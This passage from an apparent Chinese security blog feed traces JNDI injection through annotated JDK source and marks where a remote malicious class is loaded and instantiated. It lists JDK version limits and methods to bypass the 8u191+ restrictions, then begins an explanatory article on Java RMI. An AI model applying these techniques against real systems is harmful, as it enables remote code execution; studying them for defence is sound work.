&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704145837036.png" alt="image-20200704145837036"></p>
<img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704150316167.png" alt="image-20200704150316167" style="zoom:200%;">

<p>这里再提一下getRootURLContext函数，可以看到他对不同的JNDI协议配置了不同的解析函数（查看实现：option+command+B）。</p>
<p>第三个函数，RegistryContext.lookup：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入var1=aa</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//判断来到这里</span></span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));<span class="comment">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));<span class="comment">//我们进入此处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第四个函数，decodeObject：</p>
<p>先说一下怎么进入，直接下断点，直接执行到cursor，这里需要等待一会，然后直接进入看源码：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704160754859.png" alt="image-20200704160754859"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动</span></span><br><span class="line">            <span class="comment">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span></span><br><span class="line">            <span class="comment">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span></span><br><span class="line">            Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">            <span class="comment">//获取reference对象进入此处</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704155703140.png" alt="image-20200704155703140"></p>
<p>进入到这个函数之后继续跑：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704163003687.png" alt="image-20200704163003687"></p>
<p>第五个函数，继续跟进去，NamingManager：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传入Reference对象,也就是var3到refinfo</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    getObjectInstance(Object refInfo, Name name, Context nameCtx,</span><br><span class="line">                        Hashtable&lt;?,?&gt; environment)</span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// Use builder if installed</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Use reference if possible</span></span><br><span class="line">    Reference ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;<span class="comment">//满足</span></span><br><span class="line">        ref = (Reference) refInfo;<span class="comment">//复制</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;<span class="comment">//不进入</span></span><br><span class="line">        ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object answer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;<span class="comment">//进入此处</span></span><br><span class="line">        String f = ref.getFactoryClassName();<span class="comment">//函数名 ExecTest</span></span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//任意命令执行点1（构造函数、静态代码），进入此处</span></span><br><span class="line">            factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//任意命令执行点2（覆写getObjectInstance），</span></span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                    environment);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">            <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">            answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">            <span class="keyword">if</span> (answer != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> answer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704164056444.png" alt="image-20200704164056444"></p>
<p>第六个函数，getObjectFactoryFromReference：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectFactory <span class="title">getObjectFactoryFromReference</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Reference ref, String factoryName)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException,</span></span><br><span class="line"><span class="function">    InstantiationException,</span></span><br><span class="line"><span class="function">    MalformedURLException </span>&#123;</span><br><span class="line">    Class clas = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//尝试从本地获取该class</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果不在本地classpath，从cosebase中获取class</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//从我们放置恶意class文件的web服务器中获取class文件</span></span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//实例化我们的恶意class文件</span></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704164249814.png" alt="image-20200704164249814"></p>
<p>实例化会默认调用构造方法、静态代码块。<br>上面的例子就是调用了构造方法完成任意代码执行。</p>
<p>但是可以注意到之前执行任意命令成功，但是报错退出了，我们修改我们的恶意class文件，换一个命令执行点<code>factory.getObjectInstance</code>复写该函数执行命令。</p>
<ol>
<li><p>报错是因为我们的类在实例化后不能转化为ObjectFactory<code>(ObjectFactory) clas.newInstance()</code>。只需要我们的类继承该类即可。</p>
</li>
<li><p>根据ObjectFactory.java的getObjectInstance接口复写函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object getObjectInstance(Object obj, Name name, Context nameCtx,</span><br><span class="line">                             Hashtable&lt;?,?&gt; environment)</span><br><span class="line"> throws Exception;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h1><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。</p>
<p>所以不受RMI动态加载恶意类的 <strong>java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性</strong>的限制。具有更多的利用空间</p>
<p>但还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。（这也是1.8u191失败的原因）</p>
<p>之前也提到jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取</p>
<p>LDAP服务的Reference远程加载Factory类<strong>不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制</strong>，所以适用范围更广。</p>
<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，<br>在Oracle JDK 11.0.1、8u191、7u201、6u211之后 <strong>com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false</strong>。</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg" alt="img"></p>
<h1 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h1><p>对于<code>Oracle JDK 11.0.1、8u191、7u201、6u211</code>或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，依然可以进行绕过并完成利用。两种绕过方法如下：</p>
<ol>
<li>找到一个受害者本地<code>CLASSPATH</code>中的类作为恶意的<code>Reference Factory</code>工厂类，并利用这个本地的<code>Factory</code>类执行命令。</li>
<li>利用<code>LDAP</code>直接返回一个恶意的序列化对象，<code>JNDI</code>注入依然会对该对象进行反序列化操作，利用反序列化<code>Gadget</code>完成命令执行。</li>
</ol>
<p>这两种方式都非常依赖受害者本地<code>CLASSPATH</code>中环境，需要利用受害者本地的<code>Gadget</code>进行攻击，当然之后会新起一篇再说。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上就是总结JNDI的利用组合，其实个人觉得JNDI，RMI，LDAP都很像。</p>
<p><a href="[https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/](https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/)">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java RMI原理及实战</title>
    <url>/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>遥知兄弟登高处，遍插茱萸少一人。</p>
</blockquote>
<p>前一阵总结反序列化漏洞，发现RMI作为跳板，该角色必不可少。</p>
<a id="more"></a>

<h1 id="RMI概念简述"><a href="#RMI概念简述" class="headerlink" title="RMI概念简述"></a>RMI概念简述</h1><p>RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如CORBA、WebService，这两种都是独立于各个编程语言的。</p>
<p>而Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。</p>
<p>在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。所以平时说的反序列化漏洞的利用经常是涉及到RMI，就是这个意思。</p>
<p>RMI依赖的通信协议为JRMP（Java Remote Message Protocol，Java远程消息交换协议），该协议是为Java定制的，要求服务端与客户端都必须是Java编写的。</p>
<p>以下是wiki的描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</span><br><span class="line"></span><br><span class="line">Java RMI极大地依赖于接口。在需要创建一个远程对象的时候，程序员通过传递一个接口来隐藏底层的实现细节。客户端得到的远程对象句柄正好与本地的根代码连接，由后者负责透过网络通信。这样一来，程序员只需关心如何通过自己的接口句柄发送消息。</span><br></pre></td></tr></table></figure>

<p>根据wiki所说RMI全称为Remote Method Invocation，也就是远程方法调用，通俗点解释，就是跨越jvm，调用一个远程方法。众所周知，一般情况下java方法调用<br>指的是同一个jvm内方法的调用，而RMI与之恰恰相反。</p>
<p>例如我们使用浏览器对一个http协议实现的接口进行调用，这个接口调用过程我们可以称之为Interface Invocation，而RMI的概念与之非常相似，只不过RMI调用的是一个Java方法，而浏览器调用的是一个http接口，并且Java中封装了RMI的一系列定义。</p>
<p>到这里，做个简短通俗的总结：RMI是一种行为，这种行为指的是Java远程方法调用。</p>
<p><code>RMI</code>是远程方法调用的简称，能够帮助我们查找并执行远程对象的方法。通俗地说，远程调用就像把一个<code>class</code>放在A机器上，然后在B机器中调用这个<code>class</code>的方法。</p>
<ul>
<li><code>RMI</code>（<code>Remote Method Invocation</code>），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</li>
<li><code>Java RMI</code>（<code>Java Remote Method Invocation</code>），是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</li>
</ul>
<p>从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过<code>JRMP</code>（ <a href="https://en.wikipedia.org/wiki/Java_Remote_Method_Protocol" target="_blank" rel="noopener">Java Remote Method Protocol</a>）协议通信，这个协议类似于HTTP协议，规定了客户端和服务端通信要满足的规范。</p>
<h1 id="RMI代理模式"><a href="#RMI代理模式" class="headerlink" title="RMI代理模式"></a>RMI代理模式</h1><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>RMI的设计模式中，主要包括以下三个部分的角色：</p>
<ul>
<li>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li>
<li>Server：远程方法的提供者，并向Registry注册自身提供的服务</li>
<li>Client：远程方法的消费者，从Registry获取远程方法的相关信息并且调用</li>
</ul>
<h2 id="交互过程"><a href="#交互过程" class="headerlink" title="交互过程"></a>交互过程</h2><p>RMI交互过程如图所示：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625140935583.png" alt="image-20200625140935583"></p>
<p>RMI由3个部分构成，第一个是RMI Registry（JDK提供的一个可以独立运行的程序，在bin目录下），第二个是Server端的程序，对外提供远程对象，第三个是Client端的程序，想要调用远程对象的方法。</p>
<p>在设计模式中，3个角色的交互过程可简单概述为：</p>
<ol>
<li>服务端创建远程对象，<code>Skeleton</code>侦听一个随机的端口，以供客户端调用。</li>
<li>启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。</li>
<li>Server端在本地先实例化一个提供服务的<u>实现类</u>，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称；</li>
<li>客户端对<code>RMI Registry</code>发起请求，根据提供的<code>Name</code>得到<code>Stub</code>。<code>Stub</code>中包含与<code>Skeleton</code>通信的信息（地址，端口等），两者建立通信，<code>Stub</code>作为客户端代理请求服务端代理<code>Skeleton</code>并进行远程方法调用。</li>
<li>客户端<code>Stub</code>调用远程方法，调用结果先返回给<code>Skeleton</code>，<code>Skeleton</code>再返回给客户端<code>Stub</code>，<code>Stub</code>再返回给客户端本身。</li>
</ol>
<p>此外，我们可以看到，从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。</p>
<h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625141235915.png" alt="image-20200625141235915"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625144347103.png" alt="image-20200625144347103"></p>
<p>方法调用从客户端经存根（stub）、远程引用层（Remote Reference Layer）和传输层（Transport Layer）向下，传递给主机，然后再次经传输层，向上穿过远程调用层和骨干网（Skeleton），到达服务器对象。</p>
<p>存根stub位于客户端，扮演着远程服务器对象的代理，使该对象可被客户激活。远程引用层处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。</p>
<p>传输层管理实际的连接，并且追踪可以接受方法调用的远程对象。骨干网完成对服务器对象实际的方法调用，并获取返回值。返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根stub获得返回值。</p>
<p>总结：</p>
<p>Stub存根：扮演着远程服务器对象的代理的角色，使该对象可被客户激活。</p>
<p>远程引用层：处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。</p>
<p>传输层：管理实际的连接，并且追踪可以接受方法调用的远程对象。</p>
<p>Skeleton骨干网：完成对服务器对象实际的方法调用，并获取返回值。</p>
<p>返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根获得返回值。</p>
<h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p>RMI的客户端和服务器并不直接通信，客户与远程对象之间采用的代理方式进行<code>Socket</code>通信。为远程对象分别生成了客户端代理和服务端代理，其中位于客户端的代理类称为Stub即存根（包含服务器<code>Skeleton</code>信息），位于服务端的代理类称为<code>Skeleton</code>即骨干网。</p>
<h2 id="RMI-Registry"><a href="#RMI-Registry" class="headerlink" title="RMI Registry"></a>RMI Registry</h2><p><code>RMI注册表</code>，默认监听在<code>1099</code>端口上，<code>Client</code>通过<code>Name</code>向<code>RMI Registry</code>查询，得到这个绑定关系和对应的<code>Stub</code>。</p>
<blockquote>
<p>Stub的获取方式有很多，常见的方法就是调用某个远程服务上的方法，向远程服务获取存根。</p>
<p>但是调用远程方法必须需要先有远程对象的Stub，所以这里面就有一个逻辑死锁。所以JDK提供了一个RMI注册表也就是<code>RMI Registry</code>来解决这个问题。</p>
</blockquote>
<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2><p>在RMI中的核心就是远程对象，一切都是围绕这个东西来进行的。</p>
<p><strong>顾名思义，远程对象是存在于服务端以供客户端调用的对象。</strong>任何可以被远程调用的对象都必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法中调用UnicastRemoteObject.exportObject()静态方法。这个远程对象中可能有很多个函数，但是只有在远程接口中声明的函数才能被远程调用，其他的公共函数只能在本地的JVM中使用。</p>
<p>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p>
<h2 id="序列化传输数据"><a href="#序列化传输数据" class="headerlink" title="序列化传输数据"></a>序列化传输数据</h2><p>客户端远程调用时传递给服务器的参数，服务器执行后传递给客户端的返回值。参数或者返回值，在传输时候会被序列化，在被接受时会被反序列化。</p>
<p>因此这些传输的对象必须可以被序列化，相应的类必须实现<code>java.io.Serializable</code>接口，并且客户端的<code>serialVersionUID</code>字段要与服务器端保持一致。</p>
<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625144743014.png" alt="image-20200625144743014"></p>
<p>如图，先假设：</p>
<ul>
<li>有两个远程服务接口可供Client调用，Factory和Product接口</li>
<li>FactoryImpl类实现了Factory接口，ProductImpl类实现了Product接口</li>
</ul>
<p>工厂模式的处理流程为：</p>
<ol>
<li>FactoryImpl被注册到了RMI Registry中；</li>
<li>Client端请求一个Factory的引用；</li>
<li>RMI Registry返回Client端一个FactoryImpl的引用；</li>
<li>Client端调用FactoryImpl的远程方法请求一个ProductImpl的远程引用；</li>
<li>FactoryImpl返回给Client端一个ProductImpl引用；</li>
<li>Client通过ProductImpl引用调用远程方法；</li>
</ol>
<p>可以看到，客户端向<code>RMI Registry</code>请求获取到指定的FactoryImpl的引用后，再通过调用FactoryImpl的远程方法请求一个ProductImpl的远程引用，从而调用到ProductImpl引用指向的远程方法。</p>
<p>上面提到的创建<code>FactoryImpl对象</code>，设置<code>FactoryImpl对象</code>的<code>指向ProductImp</code>（通过HTTP等协议定位，可以位于其他服务器），具有指向功能的对象也可以叫做<code>reference对象</code>。</p>
<p>这种RMI+Reference的技术在JNDI注入中是单独作为一种利用方式。</p>
<p>这里执行远程对象的方法的是RMI通讯的客户端，为攻击客户端的方式，是在具体的代码和利用场景可以参考FastJson中的JNDI注入。</p>
<h1 id="java-rmi包简介"><a href="#java-rmi包简介" class="headerlink" title="java.rmi包简介"></a>java.rmi包简介</h1><h2 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h2><p>一个接口interface，这个interface中没有声明任何方法。只有定义在“remote interface”，即继承了Remote的接口中的方法，才可以被远程调用。</p>
<h2 id="RemoteException"><a href="#RemoteException" class="headerlink" title="RemoteException"></a>RemoteException</h2><p>RemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。</p>
<h2 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h2><p>提供向<code>RMI Registry</code>保存远程对象引用或者从<code>RMI Registry</code>获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如://host:port/name。</p>
<h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><p>一个interface, 其功能和Naming类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法LocateRegistry.getRegistry()获得。</p>
<h2 id="LocateRegistry"><a href="#LocateRegistry" class="headerlink" title="LocateRegistry"></a>LocateRegistry</h2><p>用于获取到<code>RMI Registry</code>的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。</p>
<h2 id="RemoteObject"><a href="#RemoteObject" class="headerlink" title="RemoteObject"></a>RemoteObject</h2><p>重新覆写了Object对象中的equals,hashCode,toString方法，从而可以用于远程调用。</p>
<h2 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h2><p>用于获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。</p>
<h2 id="Unreferenced"><a href="#Unreferenced" class="headerlink" title="Unreferenced"></a>Unreferenced</h2><p>一个interface, 声明了方法：void unreferenced()。如果一个远程对象实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。</p>
<h1 id="RMI动态类加载"><a href="#RMI动态类加载" class="headerlink" title="RMI动态类加载"></a>RMI动态类加载</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。<strong>对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件。</strong>如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
<p>在之后的JNDI注入和反序列化漏洞的利用中，正是涉及到了动态类加载。</p>
<h1 id="编写RMI的步骤"><a href="#编写RMI的步骤" class="headerlink" title="编写RMI的步骤"></a>编写RMI的步骤</h1><h2 id="定义服务端供远程调用的类"><a href="#定义服务端供远程调用的类" class="headerlink" title="定义服务端供远程调用的类"></a>定义服务端供远程调用的类</h2><p>在此之前先定义一个可序列化的Model层的用户类，其实例可放置于服务端进行远程调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonEntity</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" title="定义一个远程接口"></a>定义一个远程接口</h2><p>远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span 